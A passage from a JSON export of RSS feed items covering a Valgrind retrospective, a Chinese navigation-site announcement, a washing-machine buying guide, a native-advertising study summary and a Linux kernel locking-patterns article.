reliably.</p>\n\n<p>Speaking of software quality, I think it’s fitting that I now work full time on\nRust, a systems programming language that didn’t exist when Valgrind was\ncreated, but which basically prevents all the problems that Memcheck detects.\nAs a result, I don’t have much use for Memcheck, but I still use Cachegrind,\nCallgrind, and DHAT all the time. I’m amazed that I’m still using Cachegrind\ntoday, given that it has hardly changed in twenty years. (I only use it for\ninstruction counts, though. I wouldn’t trust the icache/dcache results at all\ngiven that they come from a best-guess simulation of an AMD Athlon circa 2002.)\nAnd DHAT is an ongoing source of joy: I’ve never used any other profiler as\ngood at telling me precisely what I want to know.</p>\n\n<p>–</p>\n\n<p>These are some of my Valgrind stories from the past twenty years. It’s far from\na complete account, but I hope it has been interesting.</p>\n\n<p>To finish, I’ll quote the first entry in the Valgrind\n<a href=\"https://valgrind.org/docs/manual/faq.html\">FAQ</a>, which I wrote a long time\nago:</p>\n\n<blockquote>\n  <p>1.1. How do you pronounce “Valgrind”?</p>\n\n  <p>The “Val” as in the word “value”. The “grind” is pronounced with a short ‘i’ –\nie. “grinned” (rhymes with “tinned”) rather than “grined” (rhymes with “find”).</p>\n\n  <p>Don’t feel bad: almost everyone gets it wrong at first.</p>\n</blockquote>\n\n<p>Happy birthday, Valgrind!</p>"
    },
    "origin": {
        "streamId": 36,
        "title": "Nicholas Nethercote",
        "htmlUrl": "https://nnethercote.github.io/",
        "feedUrl": "https://nnethercote.github.io/feed.xml"
    }
},
{
    "id": "https://blog.shuziyimin.org/?p=1321",
    "timestampUsec": "1659487403625260",
    "categories": [
        "利器",
        "基础服务",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "翻墙后可以看什么？我做了一个数字移民导航站，已收集 200+ 网站",
    "author": ";Bates",
    "published": 1640686860,
    "updated": 1640686860,
    "alternate": [
        {
            "href": "https://blog.shuziyimin.org/1321",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>点击这里前往<a href=\"https://shuziyimin.org/index.html?refer=blog-title\">导航站</a></h1>\n<p><span></span></p>\n<p>数字移民网站博客相关内容一直放在二级域名 <a href=\"https://blog.shuziyimin.org/\">blog.shuziyimin.org</a> ，主站 <a href=\"https://shuziyimin.org/\">shuziyimin.org</a> 一直空着，因为不知道应该放些什么。关于导航网站的想法已经有了很久，苦于写 CSS 太麻烦，所以一直搁置，最近偶遇 <a href=\"https://blog.shuziyimin.org/\">Viggo</a> 的 <a href=\"https://blog.shuziyimin.org/\">导航站模版</a>，就用这个模版先把导航站做起来，以后想改动样式了再手动写代码。</p>\n<h1>数字移民导航站收集了什么内容</h1>\n<p>数字移民导航站介绍的网站服务和博客教程基本一致，主要关注英文主流的新闻、流媒体、电子书等内容消费；常用的效率工具与服务等。</p>\n<p><strong> 新闻 </strong></p>\n<p>在<a href=\"https://shuziyimin.org/#news-agency-1-1\">英文新闻</a>类别，推荐的网站顺序按照传统的分发渠道来排列：通讯社、公共电视广播、商业电视台、主流报纸杂志、主流新闻网站、聚合新闻平台、主流科技媒体。从客观严肃的媒体到娱乐化流量导向的媒体，这样方便大家选择适合自己水平和风格的新闻网站，对整体英文（主要是美国）journalism 有个大体的了解。</p>\n<p>网友提到另外一种方式，是将所有主流媒体按照立场来区分，打上中立、自由派与保守派的标签，并且给出公允的评价，这个媒体是事实居多，还是观点居多。这样的标签方便大家识别自己在读的媒体大致处于图谱的哪个位置。媒体立场区分的子页面会在之后补充进去。</p>\n<p><strong> 流媒体 </strong></p>\n<p>最受欢迎的流媒体仍然是 Netflix 和 Disney Plus。一些免费的流媒体平台基本只在美国提供服务，也只有英文或西语字幕，对大部分中国关注不友好。<a href=\"https://shuziyimin.org/#streaming-misic-2-4\">音乐流媒体</a>与<a href=\"https://shuziyimin.org/#streaming-animation-2-5\">番剧流媒体</a>也有涉及。相关如何看这些流媒体的教程也会加入到导航站，方便查看。</p>\n<p><strong> 电子书 </strong></p>\n<p><strong> 如何在中国购买阅读英文电子书 </strong> 是一篇在草稿箱放了两年的文章。借着做导航站的契机，就把提及的服务全部整理出来。</p>\n<p>普通主流电子书平台选 <a href=\"https://shuziyimin.org/#ebook-3-1\">Kindle</a> 或者 <a href=\"https://shuziyimin.org/#ebook-3-1\">iBook</a> 即可；有声书选 <a href=\"https://shuziyimin.org/#ebook-audio-3-2\">Audible</a>；看狼人吸血鬼相关的网络小说去 <a href=\"https://shuziyimin.org/#ebook-web-3-4\">Wattpad</a>，看武侠小说的英文版去 <a href=\"https://shuziyimin.org/#ebook-web-3-4\">WuxiaWorld</a>。只是偶尔看两本书，并不一定要最新最流行的电子书，可以购买 <a href=\"https://shuziyimin.org/#ebook-subscription-3-5\">Kindle Unlimited</a> 或者 <a href=\"https://shuziyimin.org/#ebook-subscription-3-5\">SCRIBD</a> 的服务。如果是看电子杂志，那最不应该错过 Apple <a href=\"https://shuziyimin.org/#ebook-3-1\">News +</a>。</p>\n<p><strong> 播客 与 Newsletter</strong></p>\n<p>播客 与 Newsletter 的相关推荐还没整理出来，主要是我自己订阅的 Newsletter 就基本没看过…</p>\n<p><strong> 日常工具 </strong></p>\n<p>日常工具主要介绍了主流的浏览器、搜索引擎、邮箱服务与云服务。</p>\n<p>都是比较常见的服务，所有能看到这篇文章的读者应该早就熟悉了这些服务。</p>\n<p><strong> 生产力工具 </strong></p>\n<p>生产力工具里主要介绍了办公文档处理、新型文档与团队协作、团队交流工具。</p>\n<p>在传统办公文档工具中，我强烈推荐 <a href=\"https://shuziyimin.org/tools.html#productivity-doc-7-1\">Google workspace</a>，也就是 Google doc、Google sheet、Google drive 一系列套件，基本能够满足日常办公需求。</p>\n<p>在新型办公文档中，融资较高以及用户量达到 2 千万的产品基本都提到了。因为新型办公文档的盈利方向主要是团队付费，所以他们都在团队协作上发力。<a href=\"https://shuziyimin.org/tools.html#productivity-team-7-2\">Airtable</a> 和 <a href=\"https://shuziyimin.org/tools.html#productivity-team-7-2\">Coda</a> 文档的自动化流程都很惊艳，值得一试，可能会在文档处理上给你带来新的启发。</p>\n<p><strong> 隐私保护 </strong></p>\n<p>这块主要介绍了虚拟邮箱转发服务、密码管理器、两步验证应用。</p>\n<p>虚拟邮箱转发服务目前个人在使用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-mail-forwarder-8-1\">Forward Email</a> ，Cloudflare 的邮件转发服务还在邀请内测中，开放之后估计会选择 Cloudflare 的服务。</p>\n<p><a href=\"https://shuziyimin.org/tools.html#privacy-password-manager-8-2\">密码管理器</a>和<a href=\"https://shuziyimin.org/tools.html#privacy-mfa-8-3\">两步验证</a>的产品排列顺序都是按照 NYT Wirecutter 的推荐顺序排列。NYT Wirecutter 是 NYT 旗下做产品测评的栏目，在实际试用几次他们的推荐后，个人认为他们推荐为第一的产品基本就是这个品类中最棒的产品。密码管理器个人使用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-password-manager-8-2\">Bitwarden</a>，因为免费。 两步验证产品用的是 <a href=\"https://shuziyimin.org/tools.html#privacy-mfa-8-3\">Google Authenticator</a>。</p>\n<p><strong> 商家 / 专业用户服务 </strong></p>\n<p>这部分介绍的产品较多，涉及了 <a href=\"https://shuziyimin.org/tools.html#sme-vps-9-1\">VPS/ 轻量云服务器</a>、<a href=\"https://shuziyimin.org/tools.html#sme-website-builder-9-2\">博客 / 电商网站搭建</a>、<a href=\"https://shuziyimin.org/tools.html#sme-mail-9-3\">邮件营销服务商</a>、<a href=\"https://shuziyimin.org/tools.html#sme-newsletter-9-4\">Newsletter 服务商</a>、<a href=\"https://shuziyimin.org/tools.html#sme-payment-9-5\">收款服务</a>等。</p>\n<p>因为业务模式和预算不同，选择的产品差距也比较大，所以这块把业界能叫的上来名字的产品基本都列举出来了，按照目前的用户基数或者市场份额来排序。如果有未提及的产品，欢迎在导航站页面 <a href=\"https://blog.shuziyimin.org/\">提交</a> 你想要提到的服务。</p>\n<h1>导航站用的什么技术？</h1>\n<p>网站使用了 <a href=\"https://blog.shuziyimin.org/\">Viggo</a> 的 <a href=\"https://blog.shuziyimin.org/\">导航站模版</a>。</p>\n<p>导航站没有使用动态页面，所有静态 HTML 都是手动写的。因为收集好各个网站名称、网站 URL、网站简介、网站 icon 就基本完成了。所以收集好上述内容后，我用 Google sheet 中的 CONCATENATE 函数连接，一键生成需要的 HTML，复制粘贴就完成了页面的制作。</p>"
    },
    "origin": {
        "streamId": 39,
        "title": "数字移民",
        "htmlUrl": "https://blog.shuziyimin.org/",
        "feedUrl": "https://blog.shuziyimin.org/feed"
    }
},
{
    "id": "https://www.qwyw.org/wordpress?p=816",
    "timestampUsec": "1659488807944465",
    "categories": [
        "器物指南",
        "洗衣机",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "洗衣机：避坑指南和选购建议（更新）",
    "author": ";shrugged",
    "published": 1516716900,
    "updated": 1516716900,
    "alternate": [
        {
            "href": "https://www.qwyw.org/archives/816",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>避坑指南</h2><ul><li><p>在各国消费者组织的评测中，滚筒的总分（或综合得分）整体上高于波轮，售价也普遍高于波轮。</p></li><li><p>滚筒比波轮洗得更干净，脱水更给力，洗涤更温和（衣物磨损小）。</p></li><li><p>滚筒洗涤时间更长，机身更重（不易搬动），洗涤过程中加衣服不方便，而且通常较贵。</p></li><li><p>使用成本方面，滚筒更省水，多数机构认为波轮更省电，部分认为如果都开加热洗涤，那么滚筒更省电。</p></li><li><p>噪音和振动方面，多数机构认为滚筒噪声更大、振动更厉害。</p></li><li><p>转速更高脱水性能不一定更强。在 Which？的测试中，一些 1200 rpm 的洗衣机比 1600 rpm 的脱水效果更好。</p></li><li><p>在 Choice 的洗衣机可靠性调查中，滚筒式的可靠性和满意度都略高于波轮式。 在各国消费组织对洗衣机品牌的可靠性调查中，Miele、LG、Bosch 的可靠性较高。</p></li><li><p>CR 认为蒸汽功能可以稍微提升去污效果，去味效果比烘干好，但可能让衣服皱巴巴的。</p></li><li><p>Which？认为洗烘一体机的烘干效果一般不及独立式烘干机，它们的烘干容量一般比洗涤容量小，在使用上不方便。</p></li><li><p>容量大不一定好，洗衣机在接近填满时洗涤效果最好。大多数中小家庭用 7 kg 的就够了，大多数人一次只洗 3.5kg 的衣服。</p></li></ul><h2>选购建议</h2><ul><li><p>如果你预算充裕，衣服比较金贵，注重洁净效果，那么售价较高、对衣物比较温和、洗净能力比较强的滚筒或许适合你。</p></li><li><p>如果你所在地区房价爆表，在意空间利用，那么头顶可置物的滚筒可能适合你。</p></li><li><p>如果你预算不多，经常搬家，那么售价较便宜、机身较轻的波轮或许适合你。</p></li><li><p>如果你老是洗涤中途才想起还有衣服没洗，不喜欢弯腰操作，那么中途添衣方便、盖子上开的波轮式或许适合你。</p></li><li><p>如果你对噪音和振动很敏感，那么最好实地考察过后再做决定，实在要闭着眼睛下单，那么或许波轮比较适合你。</p></li><li><p>如果你很在意能耗，那么手洗或许适合你——玩笑，那么省水的滚筒或许适合你。至于省电，一般认为波轮较省，实际上这和开不开加热洗涤有关。</p></li></ul><h2>主要来源</h2><p><a href=\"https://www.consumerreports.org/products/front-load-washer/ratings-overview/\">Washer Ratings &amp; Reliability – Consumer Reports</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/review-and-compare/washing-machines\">Washing machine reviews – CHOICE</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines\">Washing machine reviews – Which?</a></p><p><a href=\"https://www.cca.org.cn/jmxf/detail/24914.html\">55款洗衣机商品比较试验结果 – 中国消费者协会</a></p><p><a href=\"https://www.consumer.org.hk/ws_gb/choice/488/washing-machines.html%3Fappliances%3Dtest\">叶轮式与前置式洗衣机 哪种较悭电悭水？- 香港消委会</a></p><p><a href=\"https://www.consumer.org.hk/ws_gb/choice/464_01\">测试18款洗衣机　5款洗衣特别乾净又悭水</a></p><p><a href=\"https://www.consumerreports.org/cro/washing-machines/buying-guide.htm\">Best Washing Machine Buying Guide – Consumer Reports</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/buying-guides/washing-machines\">Buying the best washing machine – CHOICE</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines/article/which-washing-machine/which-washing-machine-should-you-buy\">Which Washing Machine Should You Buy? – Which?</a></p><p><a href=\"https://www.which.co.uk/reviews/washing-machines/article/which-washing-machine/washing-machine-jargon-buster\">Washing machine jargon buster – Which?</a></p><p><a href=\"https://www.choice.com.au/home-and-living/laundry-and-cleaning/washing-machines/articles/cycle-times\">Washing machine cycle times – CHOICE</a></p>"
    },
    "origin": {
        "streamId": 41,
        "title": "器物于我",
        "htmlUrl": "https://www.qwyw.org/",
        "feedUrl": "https://www.qwyw.org/feed"
    }
},
{
    "id": "https://www.qwyw.org/?p=4286",
    "timestampUsec": "1659488807944468",
    "categories": [
        "反营销",
        "器物资讯",
        "他山之石",
        "软广",
        "软文",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "他山之石：软文的迷惑性有多强？——来自实验的证据",
    "author": ";shrugged",
    "published": 1517132160,
    "updated": 1517132160,
    "alternate": [
        {
            "href": "https://www.qwyw.org/archives/4286",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div><p>「他山之石」专题转载非本站原创的文章。本文作者：<a href=\"https://www.zhihu.com/people/econhistorylover/activities\">Manolo</a>，原始来源：<a href=\"https://zhuanlan.zhihu.com/p/32983944\">裘箕录</a>，转载已征得作者同意。</p><p>站着挣钱难，躺着挣钱不好看，不少媒体于是选择了蹲着挣钱：发软文[1]。上到Science，中到《纽约时报》，下到各大互联网新闻站，都按正常报道的格式，刊载商家提供的内容，同时在旁边羞答答地加几个小字：「广告」、「品牌合作」、「付费内容」、「sponsored」、「partner」、「brand voice」，等等。那么，消费者真的能分辨媒体本身的内容和这些广告吗？Hyman 等四位学者发表在 <em>Yale Technology Law Journal</em> 的期刊发现：<strong>大部分消费者都做不到</strong>。</p><p><img src=\"https://www.qwyw.org/wp-content/uploads/2018/01/v2-0be4720415d73e6b3b173892d6eb0cf5_hd.jpg\" alt='\"'><em>图1 左侧是消费者对软文的辨识结果，右图是消费者对正常广告的辨识结果。蓝色代表成功辨认，黄色代表辨认错误，灰色是「不知道」</em></p><p>文章的研究方法很简单粗暴：招募近1000名年龄、教育背景各异的参与者，向他们随机展示从《纽约时报》、《福布斯》、《名利场》、《大西洋月刊》等媒体提取的正常广告、软文和正常报道三种内容，然后让他们辨认。大致结果如上图所示：对于正常广告，<strong>超过80%的</strong>参与者能够辨认出这是广告；对于软文，这个比例<strong>直降到不足40%</strong>。进一步的统计分析显示：<strong>参与者年龄</strong>和正确辨认有显著的正相关；<strong>教育程度</strong>有一定正相关；<strong>性别</strong>和正确率基本不相关。</p><p><img src=\"https://www.qwyw.org/wp-content/uploads/2018/01/v2-e40bf17838631ff9f52cb39200869aa0_hd.jpg\" alt='\"'><em>表1 不同标识对消费者的迷惑程度。三列数字，从左往右，分别是参与者回答相应内容是「付费内容」、「非付费内容」和「不知道是哪一种」的比例。从上到下，迷惑力逐渐增强</em></p><p>那么，哪些词汇最能迷惑消费者呢？尽管原文针对英文，但结果也有借鉴意义。见上表，迷惑能力最差的词汇当属「付费广告」。实际上，只要标识中带「付费」二字，消费者的「雷达」都会显得特别灵敏。相比之下，「赞助内容」、「品牌声音」、「品牌出版」、「合作内容」这类标识，对消费者的引导能力要强得多。对广告商来说，让广告显得不像广告，是永恒的追求，但法律又不可能置消费者而不顾。互联网时代，广告越来越难辨认，保护消费者的法律也需要反思。</p><p>[1] 严格来说，这篇文章研究的是所谓「原生广告」。不过，原生广告和软文之间究竟有什么实质的区别？笔者在搜索引擎和知乎内部搜索，都没有得到很肯定且受公认的答案。如果知友有好的见解或批评，十分欢迎提出！</p><p>参考文献：Hyman, David A., et al. “Going native: Can consumers recognize native advertising? Does it matter?.” <em>Yale Technology Law Journal.</em> 19 (2017): 77-112.</p><div></div></div>"
    },
    "origin": {
        "streamId": 41,
        "title": "器物于我",
        "htmlUrl": "https://www.qwyw.org/",
        "feedUrl": "https://www.qwyw.org/feed"
    }
},
{
    "id": "http://blog.ffwll.ch/2022/08/locking-hierarchy.html",
    "timestampUsec": "1659530627419850",
    "categories": [
        "In-Depth Tech",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Locking Engineering Hierarchy",
    "author": "",
    "published": 1659484800,
    "updated": 1659484800,
    "alternate": [
        {
            "href": "http://blog.ffwll.ch/2022/08/locking-hierarchy.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>The first part of this series covered <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html\">principles of locking\nengineering</a>. This part goes through a pile\nof locking patterns and designs, from most favourable and easiest to adjust and\nhence resulting in a long term maintainable code base, to the least favourable\nsince hardest to ensure it works correctly and stays that way while the code\nevolves. For convenience even color coded, with the dangerous levels getting\nprogressively more crispy red indicating how close to the burning fire you are!\nThink of it as Dante’s Inferno, but for locking.</p>\n\n<p>As a reminder from the intro of the first part, with locking engineering I mean\nthe art of ensuring that there’s sufficient consistency in reading and\nmanipulating data structures, and not just sprinkling <code>mutex_lock()</code>\nand <code>mutex_unlock()</code> calls around until the result looks reasonable\nand lockdep has gone quiet.\n</p>\n\n<h2>Level 0: No Locking</h2>\n\n<p>The dumbest possible locking is no need for locking at all. Which does not mean\nextremely clever lockless tricks for a “look, no calls to\n<code>mutex_lock()</code>” feint, but an overall design which guarantees that\nany writers cannot exist concurrently with any other access at all. This\nremoves the need for consistency guarantees while accessing an object at the\narchitectural level.</p>\n\n<p>There’s a few standard patterns to achieve locking nirvana.</p>\n\n<h3>Locking Pattern: Immutable State</h3>\n\n<p><em>The</em> lesson in graphics API design over the last decade is that immutable state\nobjects rule, because they both lead to simpler driver stacks and also better\nperformance. Vulkan instead of the OpenGL with it’s ridiculous amount of\nmutable and implicit state is the big example, but atomic instead of legacy\nkernel mode setting or Wayland instead of the X11 are also built on the\nassumption that immutable state objects are a Great Thing (tm).</p>\n\n<p>The usual pattern is:</p>\n\n<ol>\n  <li>\n    <p>A single thread fully constructs an object, including any sub structures and\nanything else you might need. Often subsystems provide initialization helpers for\nobjects that driver can subclass through embedding, e.g.\n<code>drm_connector_init()</code> for initializing a kernel modesetting output\nobject. Additional functions can set up different or optional aspects of an\nobject, e.g.  <code>drm_connector_attach_encoder()</code> sets up the invariant\nlinks to the preceding element in a kernel modesetting display chain.</p>\n  </li>\n  <li>\n    <p>The fully formed object is published to the world, in the kernel this often\nhappens by registering it under some kind of identifier. This could be a global\nidentifier like <code>register_chrdev()</code> for character devices, something attached to a device like\nregistering a new display output on a driver with\n<code>drm_connector_register()</code> or some <code>struct xarray</code> in the\nfile private structure. Note that this step here requires memory barriers of\nsome sort. If you hand roll the data structure like a list or lookup\ntree with your own fancy locking scheme instead of using existing standard\ninterfaces you are on a fast path to level 3 locking hell. Don’t do that.</p>\n  </li>\n  <li>\n    <p>From this point on there are no consistency issues anymore and all threads\ncan access the object without any locking.</p>\n  </li>\n</ol>\n\n<h3>Locking Pattern: Single Owner</h3>\n\n<p>Another way to ensure there’s no concurrent access is by only allowing one\nthread to own an object at a given point of time, and have well defined handover\npoints if that is necessary.</p>\n\n<p>Most often this pattern is used for asynchronously processing a userspace\nrequest:</p>\n\n<ol>\n  <li>\n    <p>The syscall or IOCTL constructs an object with sufficient information to\nprocess the userspace’s request.</p>\n  </li>\n  <li>\n    <p>That object is handed over to a worker thread with e.g.\n<code>queue_work()</code>.</p>\n  </li>\n  <li>\n    <p>The worker thread is now the sole owner of that piece of memory and can do\nwhatever it feels like with it.</p>\n  </li>\n</ol>\n\n<p>Again the second step requires memory barriers, which means if you hand roll\nyour own lockless queue you’re firmly in level 3 territory and won’t get rid of\nthe burned in red hot afterglow in your retina for quite some time. Use standard\ninterfaces like <code>struct completion</code> or even better libraries like the\nworkqueue subsystem here.</p>\n\n<p>Note that the handover can also be chained or split up, e.g. for a nonblocking\natomic kernel modeset requests there’s three asynchronous processing pieces\ninvolved:</p>\n\n<ul>\n  <li>\n    <p>The main worker, which pushes the display state update to the hardware and\nwhich is enqueued with <code>queue_work()</code>.</p>\n  </li>\n  <li>\n    <p>The userspace completion event handling built around <code>struct\ndrm_pending_event</code> and generally handed off to the interrupt handler of\nthe driver from the main worker and processed in the interrupt handler.</p>\n  </li>\n  <li>\n    <p>The cleanup of the no longer used old scanout buffers from the preceding\nupdate. The synchronization between the preceding update and the cleanup is\ndone through <code>struct completion</code> to ensure that there’s only ever a\nsingle worker which owns a state structure and is allowed to change it.</p>\n  </li>\n</ul>\n\n<h3>Locking Pattern: Reference Counting</h3>\n\n<p>Users generally don’t appreciate if the kernel leaks memory too much, and\ncleaning up objects by freeing their memory and releasing any other resources\ntends to be an operation of the very much mutable kind. Reference counting to\nthe rescue!</p>\n\n<ul>\n  <li>\n    <p>Every pointer to the reference counted object must guarantee that a reference\nexists for as long as the pointer is in use. Usually that’s done by calling\n<code>kref_get()</code> when making a copy of the pointer, but implied\nreferences by e.g. continuing to hold a lock that protects a different pointer\nare often good enough too for a temporary pointer.</p>\n  </li>\n  <li>\n    <p>The cleanup code runs when the last reference is released with\n<code>kref_put()</code>. Note that this again requires memory barriers to work\ncorrectly, which means if you’re not using <code>struct kref</code> then it’s\nsafe to assume you’ve screwed up.</p>\n  </li>\n</ul>\n\n<p>Note that this scheme falls apart when released objects are put into some kind\nof cache and can be resurrected. In that case your cleanup code needs to somehow\ndeal with these zombies and ensure there’s no confusion, and vice versa any code\nthat resurrects a zombie needs to deal the wooden spikes the cleanup code might\nthrow at an inopportune time. The worst example of this kind is\n<code>SLAB_TYPESAFE_BY_RCU</code>, where readers that are only protected with\n<code>rcu_read_lock()</code> may need to deal with objects potentially going\nthrough simultaneous zombie resurrections, potentially multiple times, while\nthe readers are trying to figure out what is going on. This generally leads to \nlots of sorrow, wailing and ill-tempered maintainers, as the GPU subsystem\nhas and continues to experience with <code>struct dma_fence</code>.</p>\n\n<p>Hence use standard reference counting, and don’t be tempted by the siren of\ntrying to implement clever caching of any kind.</p>\n\n<h2>Level 1: Big Dumb Lock</h2>\n\n<p>It would be great if nothing ever changes, but sometimes that cannot be avoided.\nAt that point you add a single lock for each logical object. An object could be\njust a single structure, but it could also be multiple structures that are\ndynamically allocated and freed under the protection of that single big dumb\nlock, e.g. when managing GPU virtual address space with different mappings.</p>\n\n<p>The tricky part is figuring out what is an object to ensure that your lock is\nneither too big nor too small:</p>\n\n<ul>\n  <li>\n    <p>If you make your lock too big you run the risk of creating a dreaded subsystem\nlock, or violating the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#protect-data-not-code\">“Protect Data, not\nCode”</a> principle in\nsome other way. Split your locking further so that a single lock really only\nprotects a single object, and not a random collection of unrelated ones. So\none lock per device instance, not one lock for all the device instances in a\ndriver or worse in an entire subsystem.</p>\n\n    <p>The trouble is that once a lock is too big and has firmly moved into “protects\nsome vague collection of code” territory, it’s very hard to get out of that\nhole.</p>\n  </li>\n  <li>\n    <p>Different problems strike when the locking scheme is too fine-grained, e.g. in\nthe GPU virtual memory management example when every address mapping in the\nbig vma tree has its own private lock. Or when a structure has a lot of\ndifferent locks for different member fields.</p>\n\n    <p>One issue is that locks aren’t free, the overhead of fine-grained locking can\nseriously hurt, especially when common operations have to take most of the\nlocks anyway and so there’s no chance of any concurrency benefit. Furthermore\nfine-grained locking leads to the temptation of solving locking overhead with\never more clever lockless tricks, instead of radically simplifying the\ndesign.</p>\n\n    <p>The other issue is that more locks improve the odds for locking inversions,\nand those can be tough nuts to crack. Again trying to solve this with more\nlockless tricks to avoid inversions is tempting, and again in most cases the\nwrong approach.</p>\n  </li>\n</ul>\n\n<p>Ideally, your big dumb lock would always be right-sized everytime the\nrequirements on the datastructures changes. But working magic 8 balls tend to be\non short supply, and you tend to only find out that your guess was wrong when\nthe pain of the lock being too big or too small is already substantial. The\ninherent struggles of resizing a lock as the code evolves then keeps pushing you\nfurther away from the optimum instead of closer. Good luck!</p>\n\n<h2> Level 2: Fine-grained Locking</h2>\n\n<p>It would be great if this is all the locking we ever need, but sometimes there’s\nfunctional reasons that force us to go beyond the single lock for each logical\nobject approach. This section will go through a few of the common examples, and\nthe usual pitfalls to avoid.</p>\n\n<p>But before we delve into details remember to document in kerneldoc with the\ninline per-member kerneldoc comment style once you go beyond a simple single\nlock per object approach. It’s the best place for future bug fixers and\nreviewers - meaning you - to find the rules for how at least things were meant\nto work.</p>\n\n<h3>Locking Pattern: Object Tracking Lists</h3>\n\n<p>One of the main duties of the kernel is to track everything, least to make sure\nthere’s no leaks and everything gets cleaned up again. But there’s other reasons\nto maintain lists (or other container structures) of objects.</p>\n\n<p>Now sometimes there’s a clear parent object, with its own lock, which could also\nprotect the list with all the objects, but this does not always work:</p>\n\n<ul>\n  <li>\n    <p>It might force the lock of the parent object to essentially become a subsystem\nlock and so protect much more than it should when following the <a href=\"http://blog.ffwll.ch/2022/07/locking-engineering.html#protect-data-not-code\">“Protect Data, not\nCode”</a> principle. In\nthat case it’s better to have a separate (spin-)lock just for the list to be\nable to clearly untangle what the parent and subordinate object’s lock each\nprotect.</p>\n  </li>\n  <li>\n    <p>Different code paths might need to walk and possibly manipulate the list both\nfrom the container object and contained object, which would lead to locking\ninversion if the list isn’t protected by it’s own stand-alone (nested) lock.\nThis tends to especially happen when an object can be attached to multiple\nother objects, like a GPU buffer object can be mapped into multiple GPU\nvirtual address spaces of different processes.</p>\n  </li>\n  <li>\n    <p>The constraints of calling contexts for adding or removing objects from the\nlist could be different and incompatible from the requirements when walking\nthe list itself. The main example here are LRU lists where the shrinker needs\nto be able to walk the list from reclaim context, whereas the superior object\nlocks often have a need to allocate memory while holding each lock. Those\nobject locks the shrinker can then only trylock, which is generally good\nenough, but only being able to trylock the LRU list lock itself is not.</p>\n  </li>\n</ul>\n\n<p>Simplicity should still win, therefore only add a (nested) lock for lists or\nother container objects if there’s really no suitable object lock that could do\nthe job instead.</p>\n\n<h3>Locking Pattern: Interrupt Handler State</h3>\n\n<p>Another example that requires nested locking is when part of the object is\nmanipulated from a different execution context. The prime example here are\ninterrupt handlers. Interrupt handlers can only use interrupt safe spinlocks,\nbut often the main object lock must be a mutex to allow sleeping or allocating\nmemory or nesting with other mutexes.</p>\n\n<p>Hence the need for a nested spinlock to just protect the object state shared\nbetween the interrupt handler and code running from process context. Process\ncontext should generally only acquire the spinlock nested with the main object\nlock, to avoid surprises and limit any concurrency issues to just the singleton\ninterrupt handler.</p>\n\n<h3>Locking Pattern: Async Processing</h3>\n\n<p>Very similar to the interrupt handler problems is coordination with async\nworkers. The best approach is the <a href=\"http://blog.ffwll.ch/#locking-pattern-single-owner\">single owner\npattern</a>, but often state needs to be shared\nbetween the worker and other threads operating on the same object.</p>\n\n<p>The naive approach of just using a single object lock tends to deadlock:</p>\n\n<div><div><pre><code>start_processing(obj)\n{\n\tmutex_lock(&amp;obj-&gt;lock);\n\t/* set up the data for the async work */;\n\tschedule_work(&amp;obj-&gt;work);\n\tmutex_unlock(&amp;obj-&gt;lock);\n}\n\nstop_processing(obj)\n{\n\tmutex_lock(&amp;obj-&gt;lock);\n\t/* clear the data for the async work */;\n\tcancel_work_sync(&amp;obj-&gt;work);\n\tmutex_unlock(&amp;obj-&gt;lock);\n}\n\nwork_fn(work)\n{\n\tobj = container_of(work, work);\n\n\tmutex_lock(&amp;obj-&gt;lock);\n\t/* do some processing */\n\tmutex_unlock(&amp;obj-&gt;lock);\n}\n</code></pre></div></div>\n\n<p>Do not worry if you don’t spot the deadlock, because it is a cross-release\ndependency between the entire <code>work_fn()</code> and\n<code>cancel_work_sync()</code> and these are a lot trickier to spot. Since\ncross-release dependencies are a entire huge topic on themselves I won’t go into\nmore details, a good starting point is <a href=\"https://lwn.net/Articles/709849/\">this LWN\narticle</a>.</p>\n\n<p>There’s a bunch of variations of this theme, with problems in different\nscenarios:</p>\n\n<ul>\n  <li>\n    <p>Replacing the <code>cancel_work_sync()</code> with <code>cancel_work()</code>\navoids the deadlock, but often means the <code>work_fn()</code> is prone to\nuse-after-free issues.</p>\n  </li>\n  <li>\n    <p>Calling <code>cancel_work_sync()</code>before taking the mutex can work in\nsome cases, but falls apart when the work is self-rearming. Or maybe the\nwork or overall object isn’t guaranteed to exist without holding it’s lock,\ne.g. if this is part of an async processing queue for a parent structure.</p>\n  </li>\n  <li>\n    <p>Cancelling the work after the call to <code>mutex_unlock()</code> might race\nwith concurrent restarting of the work and upset the bookkeeping.</p>\n  </li>\n</ul>\n\n<p>Like with interrupt handlers the clean solution tends to be an additional nested\nlock which protects just the mutable state shared with the work function and\nnests within the main object lock. That way work can be cancelled while the main\nobject lock is held, which avoids a ton of races. But without holding the\nsublock that <code>work_fn()</code> needs, which avoids the deadlock.</p>\n\n<p>Note that in some cases the superior lock doesn’t need to exist, e.g.\n<code>struct drm_connector_state</code> is protected by the <a href=\"http://blog.ffwll.ch/#locking-pattern-single-owner\">single\nowner pattern</a>, but drivers might have some need\nfor some further decoupled asynchronous processing, e.g. for handling the\ncontent protect or link training machinery. In that case only the sublock for\nthe mutable driver private state shared with the worker exists.</p>\n\n<h3>Locking Pattern: Weak References</h3>\n\n<p><a href=\"http://blog.ffwll.ch/#locking-pattern-reference-counting\">Reference counting</a> is a great pattern, but\nsometimes you need be able to store pointers without them holding a full\nreference. This could be for lookup caches, or because your userspace API\nmandates that some references do not keep the object alive - we’ve unfortunately\ncommitted that mistake in the GPU world. Or because holding full references\neverywhere would lead to unreclaimable references loops and there’s no better\nway to break them than to make some of the references weak. In languages with a\ngarbage collector weak references are implemented by the runtime, and so no real\nworry. But in the kernel the concept has to be implemented by hand.</p>\n\n<p>Since 